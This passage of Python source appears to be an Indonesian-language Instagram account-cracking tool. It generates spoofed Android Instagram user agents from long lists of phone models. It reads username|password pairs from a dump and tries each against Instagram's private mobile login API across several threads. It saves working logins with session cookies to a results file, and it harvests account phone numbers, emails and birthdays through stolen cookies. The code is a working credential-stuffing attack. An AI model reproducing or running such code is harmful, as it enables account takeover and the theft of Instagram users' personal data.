Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Micromax; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Itel':
                    self.android_version = random.choice(['10', '11', '9', '12'])
                    self.device_model = random.choice(['itel A11', 'itel A12', 'itel A13', 'itel A14', 'itel W4003', 'itel W4002', 'ar itel W4002', 'itel W4002', 'itel A15', 'itel A15R', 'itel A16', 'itel A16 Plus', 'itel A510W', 'itel A510W', 'en_AE itel A510W', 'itel A16 Plus', 'itel A16S', 'itel W5006X', 'itel A512W', 'itel A20', 'itel A21', 'itel A22', 'itel A22 Pro', 'itel A23', 'itel L5006S', 'itel L5006C', 'itel A23A', 'itel A23R', 'itel A23S', 'itel L5007S', 'itel L5002', 'itel L5002P', 'itel A571L', 'itel A31', 'en itel A32F', 'itel A32F', 'itel W5001P', 'en_US itel W5001P', 'itel A509WM', 'itel A509WP', 'itel A509W', 'itel W5002', 'itel W5505', 'itel W5505', 'itel W5505', 'itel A571W', 'itel A571WM', 'itel A40', 'itel A41', 'itel A41 Plus', 'itel A42 Plus', 'itel A43', 'itel A44', 'itel L5502', 'itel A44 Power', 'itel A44 PowerRU', 'itel A44 Pro', 'itel A45', 'itel L5503', 'itel L5503L', 'itel L5503S', 'itel L5505', 'en itel L5505', 'itel L5505', 'MZ-itel L6006', 'itel L6006L', 'itel L6006F', 'itel A661L', 'itel A631L', 'itel A507LM', 'itel A51', 'itel A511LP', 'itel A511LQ', 'itel A52', 'itel A52 Lite', 'arm itel A52 Lite', 'itel A52S Lite', 'itel W6003', 'itel W6003', 'itel L6003P', 'itel W6004', 'itel W6004', 'itel W6004P', 'itel A611WP', 'itel A661W', 'itel A631W', 'itel A661WP', 'itel A662L', 'itel A62', 'itel A632W', 'itel W4001', 'itel W4001O', 'itel W4001P', 'itel L6004L', 'itel W5503', 'GP10X2019', 'iNote beyond', 'iNote mini', 'itel it1701', 'itel it1702', 'itel it1703', 'itel IT1351', 'itel IT1351E', 'itel it1355', 'itel it1404', 'itel it1406', 'itel it1407', 'itel it1408', 'itel it1409', 'itel-it1410', 'itel it1460 Pro', 'itel it1500', 'itel_it1502', 'itel_it1503', 'itel it1506', 'itel it1507', 'itel it1508', 'itel it1508 Plus', 'itel-it1512', 'itel it1513', 'itel it1516 Plus', 'itel it1518', 'itel-it1520', 'itel it1550', 'itel it1556 Plus', 'itel it1655', 'Itel W7001', 'itel W7001', 'itel P10001L', 'itel P11', 'itel P12', 'itel P13', 'itel P13', 'itel P13 Plus', 'itel W5005', 'itel W5005P', 'itel P551W', 'itel P552W', 'itel P31', 'itel P32', 'itel W5504', 'itel W6001', 'itel W6501', 'itel P651W', 'itel P681L', 'itel P681LM', 'itel P661W', 'itel P682LP', 'itel P41', 'itel P51', 'itel P662L', 'itel-it1553', 'itel Prime 4', 'itel W7002P', 'itel S11', 'itel S11Plus', 'itel S11 Pro', 'itel S11X', 'itel S11XB', 'itel S12', 'itel S13', 'itel S13', 'itel S13 Pro', 'itel W6002E', 'itel W6002', 'itel L6002P', 'itel W6502', 'itel W6503', 'itel L6503', 'itel S661W', 'itel A551L', 'itel S663L', 'itel S21', 'itel S31', 'itel S32', 'itel W5003', 'Itel W5003', 'itel S33', 'itel S41', 'itel S42', 'itel S662L', 'itel S662LC', 'itel S665L', 'itel W4001S', 'itel L6005', 'itel L6501', 'itel L6502', 'itel L6502', 'itel P651L', 'MZ-itel P651L', 'itel S661L', 'itel S661LP', 'itel P682LPN', 'itel S663LC', 'itel W5004D', 'itel W5008'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; ITEL MOBILE LIMITED/Itel; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Sharp':
                    self.android_version = random.choice(['11', '12', '10', '13', '9'])
                    self.device_model = random.choice(['SBM102SH2', 'SBM206SH', 'SBM61012', 'SHARP-ADS1', '507SH', 'S3-SH', 'S5-SH', 'S7-SH', 'X4-SH', 'NP601SH', '509SH', 'SH-R10A', '401SH', 'SH-02H', '305SH', '306SH', '403SH', '402SH', 'SH-D01', '606SH', 'SH-02J', 'SH-04G', 'SHF31', 'SHF32', 'SHF33', 'SHF34', 'NP501SH', 'NP807SH', 'NP806SH', 'NP805SH', 'SH-L02', 'SBM103SH', 'SHL21', 'SHL22', 'SHL23', 'SHL25', 'SBM203SH', 'SBM302SH', 'SBM303SH', 'SH-04H', 'SH-01G', 'SH-01H', 'SH-09D', 'SH-02E', 'SH-03J', '605SH', 'SHV39', 'SHV41', '701SH', 'SH-M09', '706SH', 'SHV42', 'SH-03K', '803SH', 'SH-04L', 'SHV44', '808SH', 'SH-03G', '908SH', 'SHG01', 'SH-51A', 'SH-M14', 'SH-51B', 'A101SH', 'SH-52C', 'A202SH', 'SHV40', 'SHV40_u', 'SHV34', '702SH', 'SHV38', 'SHV33', 'SHV31', 'SH-01L', 'SHV43', 'lineage_ss2', 'FS8010', 'SH-M08', 'SH-01K', 'SHV43-u', 'SH-Z01', 'Sharp Aquos S2 4/64', 'FS8016', 'SH-02M', 'SHV45', 'FS8032', 'SHV45-u', '907SH', 'SHV48', 'SH-M12-y', 'SH-RM12', 'FS8018', 'SHV46', '901SH', 'SH-RM11', 'SH-M11', 'SH-RM15', 'SH-M16', 'SH-M15', 'SH-41A', 'A003SH', 'SH-S40P', 'SH-53A', 'SH-M17', 'SHG03', 'A004SH', 'SH-54B', 'SHG05', 'SH-M19', 'SH-RM19', 'SHG07', 'SH-RM19s', 'SH-53C', 'SHG10', 'SH-M24', 'A208SH', 'SH-M05', 'SH-M07', 'AQUOS_TVE19A', 'AQUOS-TVE19C', 'AQUOS-TVX18', 'AQUOS-TVX19A', 'AQUOS-TVX19B', 'AQUOS-TVX19C', 'SHV35', 'SHV37', 'SHV37_u', 'SH-C02', 'SHG06', 'A104SH', 'SH-M20', 'SHG08', 'SH-51C', 'A204SH', '404SH', '304SH', '502SH', '503SH', '506SH', '603SH', 'SH-M10', 'SH-Z10', '801SH', 'SH-01M', '906SH', 'SHG02', 'A002SH', 'A102SH', 'SHG04', 'SH-H01', 'SH-A01', 'SHV36', 'SH-01FDQ', 'SBM003SH', 'SBM005SH', 'IS05', 'LP-01', 'LP-02', 'TG-L900S', 'SBM200SH', 'FS8014', 'FS8028', 'Sharp S2', 'SH063', 'SH530U', 'SH631W', 'SH800', 'SH837W', 'SH90B', 'SH930W', 'SH-08E', '704SH', 'A201SH', 'A001SH', 'SW001SH', 'SHV47', 'FS8002', 'FS8009'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; SHARP/KDDI; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                else:
                    self.android_version = random.choice(['10', '11', '9', '12', '13'])
                    self.device_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                return (self.useragent)

    def Android_Version(self, android_version):
        if str(android_version) == '9':
            return ('28')
        elif str(android_version) == '10':
            return ('29')
        elif str(android_version) == '11':
            return ('30')
        elif str(android_version) == '12':
            return ('31')
        else:
            return ('32')

class Dapatkan:

    def __init__(self) -> None:
        pass

    def Get_Joined(self, cookies):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Host': 'www.instagram.com',
                    'sec-fetch-site': 'none',
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                })
                response = r.get('https://www.instagram.com/your_activity/account_history/', cookies = {
                    'cookie': cookies
                }).text

                self.fb_dtsg = re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.WebBloksVersioningID = re.search('"WebBloksVersioningID",\\[\\],{"versioningID":"(.*?)"', str(response)).group(1)
                self.haste_session = re.search('"haste_session":"(.*?)"', str(response)).group(1)
                self.hsi = re.search('"hsi":"(\d+)"', str(response)).group(1)
                self.all_spin = re.search('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))

                r.headers.update({
                    'sec-fetch-site': 'same-origin',
                    'referer': 'https://www.instagram.com/your_activity/account_history/',
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'sec-fetch-mode': 'cors',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-dest': 'empty',
                })
                data = {
                    '__rev': self.all_spin.group(1),
                    '__spin_r': self.all_spin.group(1),
                    'fb_dtsg': self.fb_dtsg,
                    'hsi': self.hsi,
                    'jazoest': '26013',
                    '__spin_b': self.all_spin.group(2),
                    'lds': self.lsd,
                    '__hs': self.haste_session,
                    '__a': '1',
                    '__spin_t': self.all_spin.group(3),
                }
                response2 = r.post('https://www.instagram.com/async/wbloks/fetch/?appid=com.instagram.privacy.activity_center.account_history_screen&params=%7B%7D&type=app&__d=www&__bkv={}'.format(self.WebBloksVersioningID), data = data, cookies = {
                    'cookie': cookies
                }).text
                self.created_your = str(re.search('"text":"You created your account on.*?}}}},{"bk.components.TextSpan":{"text":"(.*?)"', str(response2)).group(1)).replace(',', '').split(' ')
                self.tanggal, self.bulan, self.tahun = self.created_your[1], self.created_your[0], self.created_your[2]
            return (f'{self.tanggal} {self.bulan} {self.tahun}')
        except (Exception):
            return ('-')

    def Akun_Sukses(self, cookies):
        try:
            with requests.session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'referer': 'https://www.instagram.com/accounts/edit/',
                    'sec-fetch-mode': 'cors',
                    'x-asbd-id': '198387',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                    'sec-fetch-site': 'same-origin',
                })
                response = json.loads(r.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies = {
                    'cookie': cookies
                }).text)['form_data']
                self.phone_number = response['phone_number'].replace('-','').replace(' ','')
                self.birthday = response['birthday'].split('-')
                self.email = response['email']
                if '10' in str({self.birthday[1]}):
                    self.get_bulan = calendar.month_name[int(self.birthday[1])]
                else:
                    self.bulan_int = self.birthday[1].replace('0','')
                    self.get_bulan = calendar.month_name[int(self.bulan_int)]
            return (self.phone_number, self.email, f'{self.birthday[2]} {self.get_bulan} {self.birthday[0]}')
        except (Exception):
            return ('-', '-', '-')

    def Akun_Publik(self, cookies, username):
        try:
            with requests.session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'referer': 'https://www.instagram.com/{}/'.format(username),
                    'sec-fetch-mode': 'cors',
                    'x-asbd-id': '198387',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                    'sec-fetch-site': 'same-origin',
                })
                response = json.loads(r.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={}'.format(username), cookies = {
                    'cookie': cookies
                }).text)['data']['user']
                self.pengikut, self.mengikuti, self.postingan = response['edge_followed_by']['count'], response['edge_follow']['count'], response['edge_owner_to_timeline_media']['count']
            return (self.pengikut, self.mengikuti, self.postingan)
        except (Exception):
            return ('0', '0', '0')

class Mengecek:

    def __init__(self) -> None:
        pass

    def Baca(self, Dump):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah, Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            with ThreadPoolExecutor(max_workers = 5) as (X):
                for z in Dump:
                    if len(z) == 0:
                        continue
                    else:
                        self.username, self.password = z.split('|')[0], z.split('|')[1]
                    X.submit(self.Eksekusi, Dump, self.username, [self.password])
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        except (KeyboardInterrupt, Exception):
            exit()

    def Eksekusi(self, total, username, _password):
        global Looping, Sukses, Checkpoint
        try:
            for password in _password:
                with requests.Session() as r:
                    self.useragent = Generate_Useragent().Instagram_Useragent().split('Safari/537.36')[1].replace(' InstagramLite 3.0.0.7.78', 'Instagram 72.0.0.21.98').replace('in_ID; 117883409)', 'in_ID; 132081622)')
                    self._hash = hashlib.md5()
                    self._hash.update(username.encode('utf-8') + password.encode('utf-8'))

                    self.hex_ = self._hash.hexdigest()
                    self._hash.update(self.hex_.encode('utf-8') + '12345'.encode('utf-8'))
                    self.x_device_id = str(uuid.uuid4())
                    data = {
                        'signed_body': '538fb2330998e97a58863693212d6e4775d997328c5de7ea5dff621267aa940b.{"id":"' + str(self.x_device_id) + '","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_direct_inbox_account_switching,ig_android_autosubmit_password_recovery_universe,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_android_typeahead_subsequence_matching,ig_android_background_voice_phone_confirmation_prefilled_phone_number_only,ig_android_crosshare_feed_post,ig_android_realtime_manager_cleanup_universe,ig_client_logging_efficiency,ig_android_user_scoped_event_bus_universe,ig_android_direct_main_tab_universe,ig_android_aymh_signal_collecting_kill_switch,ig_android_login_forgot_password_universe,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_multi_tap_login_new,ig_android_email_one_tap_auto_login_during_reg,ig_android_report_nux_completed_device,ig_android_gms_registration_universe,ig_android_reg_login_profile_photo_universe,ig_android_caption_typeahead_fix_on_o_universe,ig_android_notification_processing_universe,ig_android_run_account_nux_on_server_cue_device,ig_android_nux_add_email_device,ig_android_one_tap_show_logged_out_only_user,ig_android_device_sms_retriever_plugin_universe,ig_android_remember_password_at_login,ig_type_ahead_recover_account,ig_android_analytics_accessibility_event,ig_android_updated_copy_user_lookup_failed,ig_sem_resurrection_logging,ig_android_abandoned_reg_flow,ig_android_editable_username_in_reg,ig_android_directapp_camera_open_and_reset_universe,ig_android_publisher_integration,ig_android_account_recovery_auto_login,ig_android_hide_fb_connect_for_signup,ig_android_sim_info_upload,ig_android_skip_signup_from_one_tap_if_no_fb_sso,ig_android_hide_fb_flow_in_add_account_flow,ig_account_recovery_via_whatsapp_universe,ig_android_targeted_one_tap_upsell_universe,ig_prioritize_user_input_on_switch_to_signup,ig_android_gmail_oauth_in_reg,ig_android_login_provider_migration,ig_android_stories_reel_interactive_tap_target_size,ig_android_reg_omnibox,ig_android_gmail_autocomplete_account_over_one_tap,ig_android_background_voice_phone_confirmation,ig_android_phone_auto_login_during_reg,ig_android_hide_typeahead_for_logged_users,ig_android_bundle_size_audit_universe,ig_android_icon_perf,ig_android_video_bug_report_universe,ig_android_hindi,ig_android_bottom_sheet,ig_android_show_password_in_reg_universe,ig_android_one_tap_fallback_auto_login,ig_android_device_verification_separate_endpoint,ig_account_recovery_with_code_android_universe,ig_android_onboarding_skip_fb_connect,ig_android_phone_reg_redesign_universe,ig_android_universe_noticiation_channels,ig_restore_focus_on_reg_textbox_universe,ig_android_onetaplogin_login_upsell,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_run_device_verification,ig_two_fac_login_screen,ig_android_reg_nux_headers_cleanup_universe,ig_android_contact_import_placement_universe,ig_android_dialog_email_reg_error_universe,ig_fb_invite_entry_points,ig_android_modularized_nux_universe_device,ig_android_device_verification_fb_signup,ig_android_suma_biz_account,ig_android_onetaplogin_optimization,ig_android_browser_service_job_intent_universe,ig_android_ask_for_permissions_on_reg,ig_challenge_kill_switch,ig_android_exoplayer_settings,ig_android_low_priority_notifications_universe,ig_android_security_intent_switchoff,ig_android_only_prefill_free_email_address_in_reg,ig_android_background_voice_confirmation_block_argentinian_numbers,ig_android_do_not_show_back_button_in_nux_user_list,ig_android_2fac_auto_fill_sms_universe,ig_android_passwordless_auth,ig_android_stories_reels_tray_media_count_check,ig_android_session_scoping_facebook_account,ig_android_email_suggestions_universe,ig_android_prefill_full_name_from_fb,ig_android_access_flow_prefill"}',
                        'ig_sig_key_version': '4',
                    }
                    r.headers.update({
                        'x-ig-bandwidth-totalbytes-b': '0',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        'x-ig-bandwidth-totaltime-ms': '0',
                        'Host': 'b.i.instagram.com',
                        'accept-encoding': 'gzip, deflate',
                        'x-ig-capabilities': '3brTvw==',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'accept-language': 'id-ID, en-US',
                        'connection': 'keep-alive',
                        'x-ig-bandwidth-speed-kbps': '-1.000',
                        'x-ig-app-id': '567067343352427',
                        'x-fb-http-engine': 'Liger',
                        'x-device-id': self.x_device_id,
                        'x-ig-connection-speed': '-1kbps',
                        'user-agent': self.useragent,
                        'x-ig-connection-type': 'MOBILE(LTE)',
                    })
                    response = r.post('https://b.i.instagram.com/api/v1/qe/sync/', data = data)
                    try:
                        self.mid, self.csrftoken = response.cookies.get_dict()['mid'], response.cookies.get_dict()['csrftoken']
                    except (Exception):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] CSRF-TOKEN ERROR![bold white]", end='\r')
                        time.sleep(5.6)
                        continue
                    r.headers.pop('x-device-id')
                    try:
                        data = (f'signed_body=538fb2330998e97a58863693212d6e4775d997328c5de7ea5dff621267aa940b.\
                                %7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{str(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(self.csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(username)}%22%2C%22adid%22%3A%22{str(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{self.x_device_id}%22%2C%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(password)}%22%2C%22login_attempt_count%22%3A%220%22%7D&ig_sig_key_version=4')
                        r.headers.update({
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        })
                        response2 = r.post('https://b.i.instagram.com/api/v1/accounts/login/', data = data, allow_redirects = True)
                        #open('Response.txt','a').write(f'{username}|{password}|{self.useragent}|{response2.text}\n')
                        time.sleep(5.0)
                    except (UnicodeDecodeError, UnicodeEncodeError):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] CODEC CANNOT ENCODE CHARACTER![bold white]", end='\r')
                        time.sleep(2.5)
                        continue
                    if 'logged_in_user' in str(response2.text) or 'sessionid' in r.cookies.get_dict().keys():
                        try:
                            time.sleep(5.0)
                            self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                            self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            self.cookies = Convert().Cookies(r.cookies.get_dict())
                            try:
                                self.json_response = json.loads(response2.text)['logged_in_user']
                                self.ig_set_authorization = response2.headers['ig-set-authorization']
                                self.uniqueID = self.json_response['pk']
                                self.phone_number = self.json_response['phone_number']
                            except (Exception):
                                self.ig_set_authorization, self.uniqueID, self.phone_number = ('-'), ('-'), ('-')
                        except:
                            break
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{password}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                        tree.add(Columns([Panel(f"[bold green]{self.uniqueID}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.phone_number}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold green]{self.ig_set_authorization}", style="bold royal_blue1", width=67))
                        tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                        print(tree)
                        time.sleep(2.0)
                        Sukses.append(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                        open('Results/Ok.txt', 'a+').write(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                        break
                    elif 'challenge_required' in str(response2.text) or 'https://i.instagram.com/challenge/' in str(response2.text):
                        try:
                            time.sleep(5.0)
                            self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                            self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            self.cookies = Convert().Cookies(r.cookies.get_dict())
                            self.checkpoint_url = json.loads(response2.text)['challenge']['api_path']
                        except:
                            break
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{password}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                        tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                        print(tree)
                        time.sleep(2.0)
                        Checkpoint.append(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
